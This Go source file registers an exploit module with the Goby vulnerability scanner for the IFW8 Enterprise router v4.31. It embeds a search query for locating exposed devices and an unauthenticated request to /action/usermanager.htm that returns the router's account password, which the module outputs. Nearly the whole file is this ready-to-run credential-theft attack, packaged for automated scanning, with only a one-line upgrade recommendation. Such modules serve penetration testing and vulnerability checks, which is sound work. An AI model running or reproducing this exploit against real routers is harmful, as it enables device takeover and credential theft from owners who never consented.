package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "IFW8 Enterprise router v4.31 Password leakage ",
    "Level": "2",
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "GobyQuery": "body=\"企业级流控云路由器\"",
    "Description": "Bee Internet enterprise router V4.31 has unauthorized access to the interface, resulting in the attacker can get the router account password to take over the router through this vulnerability",
    "Product": "IFW8 Enterprise router v4.31",
    "Homepage": "http://ifw8.com",
    "Author": "yanwu",
    "Impact": "<p>Through this vulnerability, we can get the router account password to take over the router</p>",
    "Recommendation": "<p>升级安全版本</p>",
    "References": [
        "http://wiki.xypbk.com/"
    ],
    "HasExp": true,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/action/usermanager.htm",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "pwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/action/usermanager.htm",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "DisclosureDate": "2021-05-23",
    "PocId": "6828"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
